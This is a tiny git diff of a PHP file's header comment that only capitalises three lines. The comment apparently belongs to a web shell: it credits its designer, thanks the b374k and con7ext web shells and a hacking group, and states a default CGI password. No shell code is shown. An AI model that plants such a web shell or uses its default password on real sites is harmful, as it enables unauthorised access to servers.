@@ -1,9 +1,9 @@
 <?php
 
 /**
-design by TubagusNM
-default pass cgi: xaisyndicate
-thx to con7ext_shell, b374k shell, and all members garuda tersakti 72
+Design by TubagusNM
+Default pass cgi: xaisyndicate
+Thx to con7ext_shell, b374k shell, and all members garuda tersakti 72
 **/ 
 
 
